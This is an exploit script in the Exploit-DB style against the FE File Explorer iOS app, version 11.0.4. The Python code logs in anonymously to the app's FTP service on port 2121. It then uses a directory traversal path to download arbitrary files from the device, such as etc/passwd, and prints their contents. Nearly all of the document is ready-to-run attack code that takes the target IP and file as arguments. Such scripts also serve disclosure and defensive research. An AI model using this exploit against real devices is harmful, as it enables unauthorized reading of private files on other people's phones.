# Exploit Title: FE File Explorer Local File inclusion
# Date: Sep 6, 2022
# Exploit Author: Chokri Hammedi
# Vendor Homepage: https://www.skyjos.com/
# Software Link: https://apps.apple.com/us/app/fe-file-explorer-file-manager/id510282524
# Version: 11.0.4
# Tested on: iPhone ios 15.6


from ftplib import FTP
import argparse

help = " FE File Explorer Local File inclusion"
parser = argparse.ArgumentParser(description=help)
parser.add_argument("--target", help="Target IP", required=True)
parser.add_argument("--file", help="File To Open eg: etc/passwd")

args = parser.parse_args()


ip = args.target
port = 2121 # Default Port
files = args.file



ftpConnection = FTP()
ftpConnection.connect(host=ip, port=port)
ftpConnection.login();

def downloadFile():
        ftpConnection.cwd('/../../../../../../../../../../../../../../../../')
        ftpConnection.retrbinary(f"RETR {files}", open('data.txt', 'wb').write)
        ftpConnection.close()
        file = open('data.txt', 'r')
        print (f"[***] The contents of {files}\n")
        print (file.read())

downloadFile()
        
